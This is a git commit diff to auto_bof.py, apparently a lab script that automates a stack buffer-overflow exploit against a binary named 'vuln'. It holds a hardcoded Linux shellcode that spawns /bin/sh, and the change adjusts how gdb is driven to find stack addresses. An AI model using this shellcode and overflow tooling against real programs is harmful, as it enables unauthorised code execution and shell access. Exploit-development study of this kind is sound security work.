7deacf66ac8cf3c0aeb08870e233567ea97f388d
myrtopar <myrtopar08@gmail.com>
2024-09-06 01:50:18 +0300

    segfault

--- auto_bof.py
+++ auto_bof.py
@@ -86,16 +86,20 @@ def main():
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     #then call gdb to find in what adresses the stack fluctuates -> info proc mapping
-    gdb_process = subprocess.Popen("gdb {vuln}", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+    gdb_process = subprocess.Popen("gdb vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
     commands = f"""
     set disable-randomization off
-    b {vuln}
+    set breakpoint pending on
+    b vuln
     r {trash_args}
     info proc mapping
     q
     y
     """
-    output, _ = gdb_process.communicate(commands)
+
+    gdb_process.stdin.write(commands)
+    gdb_process.stdin.flush()
+    output, _ = gdb_process.communicate()
 
     middle = stack_middle_address(output)
 
